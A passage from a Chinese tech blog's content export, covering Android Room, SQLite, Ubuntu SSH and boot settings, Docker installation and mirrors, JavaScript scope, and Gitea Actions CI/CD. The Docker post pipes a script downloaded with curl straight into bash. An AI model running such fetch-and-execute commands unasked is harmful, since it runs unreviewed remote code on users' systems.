<li><p>验证ssl是否配置完成<br>将项目启动到服务器后，通过域名访问，如果访问成功则没有问题<br>如果是在本地访问。可以选择修改hosts文件，为域名添加上localhost的映射，如果访问没有问题则配置完成</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>ssl证书</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlite没有boolean类型</title>
    <url>/posts/b484a6ae/</url>
    <content><![CDATA[<p>在数据库中，通常并没有具体的boolean类型，所以对于存入数据库的true或者false都会转化为1和0进行存储，因此在需要写sql语句的时候需要注意这一点。</p>
]]></content>
      <categories>
        <category>sqlite</category>
      </categories>
  </entry>
  <entry>
    <title>room数据库最佳实践</title>
    <url>/posts/5a9563fd/</url>
    <content><![CDATA[<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>1.SQL语句高亮<br>2. 简单入门<br>3. 功能强大<br>4. 数据库监听<br>5. 支持Kotlin协程&#x2F;RxJava&#x2F;Guava</p>
<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">dependencies&#123;</span><br><span class="line">    <span class="keyword">val</span> room_version = <span class="string">&quot;2.2.0-rc01&quot;</span></span><br><span class="line"></span><br><span class="line">    implementation(<span class="string">&quot;androidx.room:room-runtime:<span class="variable">$room_version</span>&quot;</span>)</span><br><span class="line">    annotationProcessor <span class="string">&quot;androidx.room:room-compiler:<span class="variable">$room_version</span>&quot;</span> </span><br><span class="line">    <span class="comment">// Kotlin 使用 kapt 替代 annotationProcessor (需要在插件中应用kapt)</span></span><br><span class="line">    <span class="comment">//kapt (&quot;androidx.room:room-compiler:2.6.1&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可选 - Kotlin扩展和协程支持</span></span><br><span class="line">    implementation(<span class="string">&quot;androidx.room:room-ktx:<span class="variable">$room_version</span>&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>ROOM会在创建数据库对象时就会创建好所有已注册的数据表结构</p>
<ol>
<li>创建数据库</li>
<li>创建操作接口</li>
<li>创建数据类: 一般为JSON反序列出的data class</li>
</ol>
<h3 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity(tableName = <span class="string">&quot;todo_item&quot;</span>)</span></span><br><span class="line"><span class="keyword">data</span> <span class="keyword">class</span> <span class="title class_">ToDoItem</span>(</span><br><span class="line">    <span class="meta">@PrimaryKey(autoGenerate = true)</span></span><br><span class="line">    <span class="keyword">val</span> id: <span class="built_in">Int</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">val</span> title: String = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="keyword">val</span> date: String = System.currentTimeMillis().toString(),</span><br><span class="line">    <span class="keyword">var</span> completed: <span class="built_in">Boolean</span> = <span class="literal">false</span>,</span><br><span class="line">    <span class="keyword">var</span> archived: <span class="built_in">Boolean</span> = <span class="literal">false</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="Dao接口"><a href="#Dao接口" class="headerlink" title="Dao接口"></a>Dao接口</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ToDoItemDao</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(<span class="string">&quot;SELECT * FROM todo_item WHERE archived = 0  ORDER BY id DESC&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getAll</span><span class="params">()</span></span>: List&lt;ToDoItem&gt;</span><br><span class="line">    <span class="meta">@Insert</span></span><br><span class="line">    <span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">insert</span><span class="params">(toDoItem: <span class="type">ToDoItem</span>)</span></span>:<span class="built_in">Long</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Update</span></span><br><span class="line">    <span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">update</span><span class="params">(toDoItem: <span class="type">ToDoItem</span>)</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="数据库实体"><a href="#数据库实体" class="headerlink" title="数据库实体"></a>数据库实体</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Database(entities = [ToDoItem::class], version = 2, exportSchema = false)</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">RoomDB</span> : <span class="type">RoomDatabase</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="function"><span class="keyword">fun</span> <span class="title">ToDoItemDao</span><span class="params">()</span></span>: ToDoItemDao</span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">var</span> INSTANCE: RoomDB? = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">getInstance</span><span class="params">(context: <span class="type">Context</span>)</span></span>: RoomDB &#123;</span><br><span class="line">            <span class="keyword">return</span> runBlocking(Dispatchers.IO) &#123;</span><br><span class="line">                <span class="keyword">var</span> instance = INSTANCE</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = Room.databaseBuilder(context, RoomDB::<span class="keyword">class</span>.java, <span class="string">&quot;todo_db&quot;</span>)</span><br><span class="line">                        .allowMainThreadQueries()<span class="comment">//允许在主线程操作</span></span><br><span class="line">                        .addCallback(DbCreateCallBack())<span class="comment">//增加回调监听</span></span><br><span class="line">                        .addMigrations(MIGARATION_1_2)<span class="comment">//增加数据库迁移</span></span><br><span class="line">                        .build()</span><br><span class="line">                &#125;</span><br><span class="line">                instance</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">val</span> MIGARATION_1_2 = <span class="keyword">object</span> : Migration(<span class="number">1</span>, <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">migrate</span><span class="params">(db: <span class="type">SupportSQLiteDatabase</span>)</span></span> &#123;</span><br><span class="line">                db.execSQL(<span class="string">&quot;ALTER TABLE todo_item ADD COLUMN archived INTEGER NOT NULL DEFAULT 0&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">DbCreateCallBack</span><span class="params">()</span></span>: RoomDatabase.Callback &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">object</span> : RoomDatabase.Callback() &#123;</span><br><span class="line">                <span class="comment">//第一次创建数据库时调用</span></span><br><span class="line">                <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(db: <span class="type">SupportSQLiteDatabase</span>)</span></span> &#123;</span><br><span class="line">                    <span class="keyword">super</span>.onCreate(db)</span><br><span class="line">                    Log.d(<span class="string">&quot;First&quot;</span>, <span class="string">&quot;first onCreate db version: &quot;</span> + db.version)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h3><p>ROOM支持查询函数返回四种类型</p>
<ol>
<li>Single&#x2F;Mabye&#x2F;Completable&#x2F;Observable&#x2F;Flowable 等RxJava的被观察者</li>
<li>LiveData: JetPack库中的活跃观察者</li>
<li>Flow: Kotlin协程中的流</li>
<li>Cursor: SQLite在Android中最原始的查询结果集, 此返回对象无法监听数据库变化</li>
</ol>
<p>我不再推荐在项目中使用RxJava, 因为无法方便实现并发并且容易产生回调地域. 这里建议使用协程</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Query(<span class="string">&quot;select * from Book&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">find</span><span class="params">()</span></span>: Flow&lt;Array&lt;Book&gt;&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Query(<span class="string">&quot;select * from Book&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">find</span><span class="params">()</span></span>: Observable&lt;Array&lt;Book&gt;&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Query(<span class="string">&quot;select * from Book&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">find</span><span class="params">()</span></span>: LiveData&lt;Array&lt;Book&gt;&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Query(<span class="string">&quot;select * from Book&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">find</span><span class="params">()</span></span>: LiveData&lt;List&lt;Book&gt;&gt; <span class="comment">// List 或者 Array都是可以的</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Query(<span class="string">&quot;select * from Book&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">find</span><span class="params">()</span></span>: Flow&lt;Array&lt;Book&gt;&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Query(<span class="string">&quot;select * from Book&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">find</span><span class="params">()</span></span>: Cursor</span><br></pre></td></tr></table></figure>

<h3 id="多表查询-1对n-n对n"><a href="#多表查询-1对n-n对n" class="headerlink" title="多表查询,1对n,n对n"></a>多表查询,1对n,n对n</h3><p>这一部分内容在前期学习时用的较少,因此需要使用时可以再此学习<br>直接看这篇文章<a href="https://juejin.cn/post/6844904079098036232">https://juejin.cn/post/6844904079098036232</a></p>
<blockquote>
<p>该文章借鉴于<a href="https://juejin.cn/post/6844904200162246663">1</a><a href="https://blog.csdn.net/u010741032/article/details/117537523">2</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>android</tag>
        <tag>room数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu server快速启动</title>
    <url>/posts/a63a6c9a/</url>
    <content><![CDATA[<p>在配置本地服务器时，安装了<code>ubuntu server</code>他有一个默认配置就是会在启动时检查所有网口是否都正确配置了网络。<br>而且这个时候他会等待接近2分钟以上的时间，而对于部分人而言，只连接一个网口就足够使用了。所以为了快速启动服务跳过这些等待时间需要修改一些配置参数</p>
<p>自检命令：<code>systemd-analyze blame</code>系统自查，会检测系统启动耗费了哪些时间<br><img src="https://image.zfxt.top/hexo-blog/ubuntu-server%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8-2024-12-25-10-49-12.png" alt="ubuntu-server快速启动-2024-12-25-10-49-12"></p>
<p><code>/etc/systemd/system/network-online.target.wants</code>在这个目录下，有关于系统网络启动时的配置文件：<code>systemd-networkd-wait-online.service</code></p>
<p><img src="https://image.zfxt.top/hexo-blog/ubuntu-server%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8-2024-12-25-10-50-40.png" alt="ubuntu-server快速启动-2024-12-25-10-50-40"><br>加上<code>TimeoutStartSec=3sec</code>这个参数后，执行系统重启，你就可以享受快速的系统重启了<br><img src="https://image.zfxt.top/hexo-blog/ubuntu-server%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8-2024-12-25-10-48-40.png" alt="ubuntu-server快速启动-2024-12-25-10-48-40"></p>
]]></content>
      <categories>
        <category>本地化服务</category>
      </categories>
  </entry>
  <entry>
    <title>ubuntu使用ssh密钥登录</title>
    <url>/posts/dd9695f2/</url>
    <content><![CDATA[<h2 id="配置公钥和私钥"><a href="#配置公钥和私钥" class="headerlink" title="配置公钥和私钥"></a>配置公钥和私钥</h2><p>在<code>Ubuntu</code>或者<code>Windows</code>上运行ssh-keygen,生成一对公私钥。他会默认保存在<code>C:/&#123;User&#125;/.ssh</code>目录下<br><code>id_rsa</code>是私钥，需要传输到其他客户端机器，比如Windows做后续处理。<br><code>id_ras.pub</code>是公钥，里面含有公钥字符串。</p>
<p>然后将<code>id_ras.pub</code>公钥的内容复制到你ubuntu用户下的<code>authorized_keys</code>文件中<br><img src="https://image.zfxt.top/hexo-blog/ubuntu%E4%BD%BF%E7%94%A8ssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95-2024-12-25-11-23-57.png" alt="ubuntu使用ssh密钥登录-2024-12-25-11-23-57"><br>把公钥复制到这个文件中即可。</p>
<blockquote>
<p>注意，使用追加，而不是覆盖。不要把别人也部署过的公钥删除了</p>
</blockquote>
<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>禁止密码登陆和允许免密码登陆都是通过修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config 文件实现，只需要设置如下的两个选项为yes 和no即可：<br>PubkeyAuthentication yes<br>PasswordAuthentication no</p>
<p>修改完毕后重启ssh 服务：<br>sudo service ssh restart</p>
<blockquote>
<p>注意，有的时候，你会发现你修改的配置没有生效。因为他在这个目录下也有相同的配置文件。你需要将这个目录下的配置文件也修改后才可以生效。<br><img src="https://image.zfxt.top/hexo-blog/ubuntu%E4%BD%BF%E7%94%A8ssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95-2024-12-25-11-28-59.png" alt="ubuntu使用ssh密钥登录-2024-12-25-11-28-59"></p>
</blockquote>
]]></content>
      <categories>
        <category>本地化服务</category>
      </categories>
  </entry>
  <entry>
    <title>ubuntu修改计算机名</title>
    <url>/posts/c4b6629f/</url>
    <content><![CDATA[<ol>
<li>打开hosts<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/hosts</span><br></pre></td></tr></table></figure>
<img src="https://image.zfxt.top/hexo-blog/ubuntu%E4%BF%AE%E6%94%B9%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%90%8D-2024-01-23-31-55.png"></li>
<li>然后修改第二行的内容，把genius-Lenovo-ideapad-Y700-15ISK修改为你想要的计算机名字，最后保存</li>
<li>然后在终端中输入 gedit &#x2F;etc&#x2F;hostname</li>
<li>将内容修改为你想要的名字，保存，重启，OK</li>
</ol>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>一键安装docker</title>
    <url>/posts/266cf7d5/</url>
    <content><![CDATA[<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>docker官方提供了傻瓜式安装脚本，为你做好所有工作，免去了手动安装的繁琐。</p>
<p>本文实测系统环境：debian11</p>
<p>执行以下命令</p>
<blockquote>
<p>不知道从什么时候开始官方脚本已经默认也安装了 docker compose, 不需要后面的手动安装了, 因此已删除多余的内容</p>
</blockquote>
<p>也就是说, 只需要执行下面的一键脚本</p>
<blockquote>
<p>注意是 docker compose 而不是 docker-compose. 执行命令时候也没有这个杠</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker</span><br></pre></td></tr></table></figure>

<p>可在此命令后附带–mirror参数设置镜像源，以提高国内服务器下载docker的速度</p>
<p>如使用阿里云镜像:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>

<h2 id="docker主动代理"><a href="#docker主动代理" class="headerlink" title="docker主动代理"></a>docker主动代理</h2><ol>
<li>创建或修改 Docker 配置文件</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内容如下：</span></span><br><span class="line">&#123;</span><br><span class="line"> &quot;proxies&quot;:</span><br><span class="line">   &#123;</span><br><span class="line">     &quot;httpProxy&quot;: &quot;http://172.17.0.1:8123&quot;,</span><br><span class="line">     &quot;httpsProxy&quot;: &quot;http://172.17.0.1:8123&quot;,</span><br><span class="line">     &quot;noProxy&quot;: &quot;localhost,127.0.0.1,.daocloud.io&quot;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>重新加载并重启 Docker 服务<br>配置完成后，重新加载 systemd 配置并重启 Docker 服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>

<p>验证代理配置<br>可以通过以下命令验证代理配置是否生效：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure>

<h2 id="部署docker镜像代理"><a href="#部署docker镜像代理" class="headerlink" title="部署docker镜像代理"></a>部署docker镜像代理</h2><p>第一步：Fork项目：项目为CM大佬创建维护<br><a href="https://github.com/cmliu/CF-Workers-docker.io">CF-Worker</a></p>
<p>第二步：CF部署Pages，选择第一步中Fork的仓库，配置页面保持默认，点击部署</p>
<p>第三步：添加自定义域，绑定自己的域名</p>
<p><img src="https://image.zfxt.top/hexo-blog/%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85docker-2024-06-18-15-22-04.png" alt="一键安装docker-2024-06-18-15-22-04"></p>
<blockquote>
<p>可设置环境变量URL302和URL防止域名被污染或被墙，可设置nginx页面进行伪装</p>
</blockquote>
<p>CM大佬仓库还有第三方Docker官方镜像服务地址可直接使用</p>
<p>然后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/docker/daemon.json</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内容如下：</span></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://xx4bwyg2.mirror.aliyuncs.com&quot;,</span><br><span class="line">    &quot;http://f1361db2.m.daocloud.io&quot;,</span><br><span class="line">    &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http://hub-mirror.c.163.com&quot;,</span><br><span class="line">    &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">    &quot;你自己的镜像地址&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">退出并保存</span></span><br><span class="line">:wq</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使配置生效</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启Docker</span></span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<p>就完成了镜像源的配置了</p>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>win下ssh连接报错被修改</title>
    <url>/posts/6ceb97f0/</url>
    <content><![CDATA[<h2 id="删除旧ssh密钥"><a href="#删除旧ssh密钥" class="headerlink" title="删除旧ssh密钥"></a>删除旧ssh密钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[user@hostname ~]$ ssh root@pong</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</span><br><span class="line">Someone could be eavesdropping on you right now (man-in-the-middle attack)!</span><br><span class="line">It is also possible that a host key has just been changed.</span><br><span class="line">The fingerprint for the RSA key sent by the remote host is</span><br><span class="line">6e:45:f9:a8:af:38:3d:a1:a5:c7:76:1d:02:f8:77:00.</span><br><span class="line">Please contact your system administrator.</span><br><span class="line">Add correct host key in /home/hostname /.ssh/known_hosts to get rid of this message.</span><br><span class="line">Offending RSA key in /var/lib/sss/pubconf/known_hosts:4</span><br><span class="line">RSA host key for pong has changed and you have requested strict checking.</span><br><span class="line">Host key verification failed.</span><br></pre></td></tr></table></figure>

<p>通常这种问题出现在你常连接到一个主机设备被物理重置或者重装系统，导致主机的密钥发生变化，而你的本地计算机还保留着旧的密钥，所以会报错。</p>
<p>这时你只需要删除掉本来的密钥即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -R &lt;host&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title>作用域链与变量声明</title>
    <url>/posts/27088d89/</url>
    <content><![CDATA[<h2 id="作用域及作用链"><a href="#作用域及作用链" class="headerlink" title="作用域及作用链"></a>作用域及作用链</h2><ol>
<li>全局作用域；</li>
<li>函数作用域；</li>
<li>块级作用域；</li>
</ol>
<h3 id="全局作用域"><a href="#全局作用域" class="headerlink" title="全局作用域"></a>全局作用域</h3><p>全局作用域的变量可以在程序任意位置访问到。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> greeting = <span class="string">&#x27;Hello World!&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(greeting);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 打印 &#x27;Hello World!&#x27;</span></span><br><span class="line"><span class="title function_">greet</span>();</span><br></pre></td></tr></table></figure>
<h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p>函数作用域也叫局部作用域，如果一个变量是在函数内部声明的它就在一个函数作用域下面。这些变量只能在函数内部访问，不能在函数以外去访问。</p>
<h3 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h3><p>ES6引入了let和const关键字,和var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中.在大括号之外不能访问这些变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 块级作用域中的变量</span></span><br><span class="line">  <span class="keyword">let</span> greeting = <span class="string">&#x27;Hello World!&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> lang = <span class="string">&#x27;English&#x27;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(greeting); <span class="comment">// Prints &#x27;Hello World!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 变量 &#x27;English&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lang);</span><br><span class="line"><span class="comment">// 报错：Uncaught ReferenceError: greeting is not defined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(greeting);</span><br></pre></td></tr></table></figure>
<h1 id="错误示例"><a href="#错误示例" class="headerlink" title="错误示例"></a>错误示例</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">c</span>)&#123;</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(a);<span class="comment">//undefined</span></span><br><span class="line">       <span class="keyword">var</span> a= <span class="number">1</span>;</span><br><span class="line">       <span class="variable language_">arguments</span>[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(c);<span class="comment">//2</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(a);<span class="comment">//1</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="title function_">b</span>(<span class="number">3</span>);</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(a);<span class="comment">//0</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">//请问第一个为何是undefined呢？var a = 0：不是全局定义并赋值了嘛？求解</span></span><br></pre></td></tr></table></figure>
<p>正确解答：<br>你把函数里面的 var a 写在 console.log(a);的前面就应该有了。你注意下js代码的执行顺序，<em><strong>先声明后执行</strong></em>，此外他会优先在当前的作用域里面找。 上面的代码执行顺序是这样的 1，var a ；2，声明个函数 b;3,执行赋值 a &#x3D;0；4,调用 b(3),进入 函数 b里面执行，这个时候 又会在 b函数里面 开辟内存空间，同样的也是 先声明后执行从上往下，里面的进程是这样的。1，声明 c; 2,声明 a 然后开始执行 c &#x3D;3 ，在执行 console.log(a);这里注意 a在b函数里面已经声明了，所以他不会去外面找。而里面的这个a 只是 声明了 没有赋值 当时 会报 undefined。后面就不说了。</p>
]]></content>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>使用gitea action实现CICD</title>
    <url>/posts/f5d3f52f/</url>
    <content><![CDATA[<h1 id="CICD"><a href="#CICD" class="headerlink" title="CICD"></a>CICD</h1><p>CI&#x2F;CD 是持续集成和持续交付&#x2F;部署的缩写，旨在简化并加快软件开发生命周期。</p>
<p>持续集成（CI）是指自动且频繁地将代码更改集成到共享源代码存储库中的做法。持续交付和&#x2F;或持续部署（CD）是一个由两部分组成的过程，涉及代码更改的集成、测试和交付。持续交付不会自动部署到生产环境，持续部署则会自动将更新发布到生产环境。<br><img src="https://image.zfxt.top/hexo-blog/%E4%BD%BF%E7%94%A8gitea-action%E5%AE%9E%E7%8E%B0CICD-2024-12-25-13-21-32.png" alt="使用gitea-action实现CICD-2024-12-25-13-21-32"></p>
<p>简单来说，就是我们将代码提交到远程仓库后，自动化服务会替我们完成测试交付和部署的功能。</p>
<h1 id="常用的CICD工具"><a href="#常用的CICD工具" class="headerlink" title="常用的CICD工具"></a>常用的CICD工具</h1><p><img src="https://image.zfxt.top/hexo-blog/%E4%BD%BF%E7%94%A8gitea-action%E5%AE%9E%E7%8E%B0CICD-2024-12-25-16-34-09.png" alt="使用gitea-action实现CICD-2024-12-25-16-34-09"><br><img src="https://image.zfxt.top/hexo-blog/%E4%BD%BF%E7%94%A8gitea-action%E5%AE%9E%E7%8E%B0CICD-2024-12-25-13-23-42.png" alt="使用gitea-action实现CICD-2024-12-25-13-23-42"><br>在本文中我将演示使用<code>gitea actions</code>实现hexo的自动部署功能。</p>
<h1 id="正片开始"><a href="#正片开始" class="headerlink" title="正片开始"></a>正片开始</h1><p>正如其名，其实gitea和github actions的功能几乎一致，就是沿用下来了而已。<br>在我们的操作过程中，主要有三步：</p>
<ol>
<li>使用docker启动一个act_runner，作为action的服务器</li>
<li>配置<code>deploy.yml</code>实现推送时，自动部署到服务器</li>
<li>使用nginx展示部署后的页面</li>
</ol>
<h2 id="安装act-runner"><a href="#安装act-runner" class="headerlink" title="安装act_runner"></a>安装act_runner</h2><p>打开gitea的<a href="https://docs.gitea.com/zh-cn/usage/actions/overview">官方文档</a>可以查阅关于<code>act_runner</code>的配置信息</p>
<h3 id="注册runner"><a href="#注册runner" class="headerlink" title="注册runner"></a>注册runner</h3><p>在运行Act Runner之前，需要进行注册，因为Runner需要知道从哪里获取Job，并且对于Gitea实例来说，识别Runner也很重要。</p>
<p><strong>Runner级别</strong><br>您可以在不同级别上注册Runner，它可以是：</p>
<p>实例级别：Runner将为实例中的所有存储库运行Job。<br>组织级别：Runner将为组织中的所有存储库运行Job。<br>存储库级别：Runner将为其所属的存储库运行Job。<br>请注意，即使存储库具有自己的存储库级别Runner，它仍然可以使用实例级别或组织级别Runner。未来的版本可能提供更多对此进行更好控制的选项。</p>
<p><strong>获取注册令牌</strong><br>Runner级别决定了从哪里获取注册令牌。</p>
<p>实例级别：管理员设置页面，例如 <code>&lt;your_gitea.com&gt;/admin/actions/runners</code>。<br>组织级别：组织设置页面，例如 <code>&lt;your_gitea.com&gt;/&lt;org&gt;/settings/actions/runners</code>。<br>存储库级别：存储库设置页面，例如 <code>&lt;your_gitea.com&gt;/&lt;owner&gt;/&lt;repo&gt;/settings/actions/runners</code>。</p>
<h3 id="启动runner"><a href="#启动runner" class="headerlink" title="启动runner"></a>启动runner</h3><p>我这里直接使用docker compose启动一个。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">runner:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">gitea/act_runner:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">act_runner</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">CONFIG_FILE:</span> <span class="string">/config.yaml</span></span><br><span class="line">      <span class="attr">GITEA_INSTANCE_URL:</span> <span class="string">&quot;$&#123;INSTANCE_URL&#125;&quot;</span></span><br><span class="line">      <span class="attr">GITEA_RUNNER_REGISTRATION_TOKEN:</span> <span class="string">&quot;$&#123;REGISTRATION_TOKEN&#125;&quot;</span></span><br><span class="line">      <span class="attr">GITEA_RUNNER_NAME:</span> <span class="string">&quot;$&#123;RUNNER_NAME&#125;&quot;</span></span><br><span class="line">      <span class="attr">GITEA_RUNNER_LABELS:</span> <span class="string">&quot;$&#123;RUNNER_LABELS&#125;&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> 